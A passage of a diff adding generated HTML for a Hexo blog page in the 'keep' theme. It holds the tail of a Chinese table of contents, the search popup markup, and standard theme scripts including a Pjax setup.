href="#%E6%90%9C%E7%B4%A2%E5%88%97%EF%BC%8C%E8%A1%A8%E6%88%96%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">2.1.18.</span> <span class="nav-text">搜索列，表或数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E8%87%AA%E5%AE%9A%E4%B9%89-SQL-%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.1.19.</span> <span class="nav-text">运行自定义 SQL 语句</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%AA%E4%BA%BA%E5%89%A7%E5%9C%BA"><span class="nav-number">2.2.</span> <span class="nav-text">个人剧场</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/code-copy.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/toc.js"></script>
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        const pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
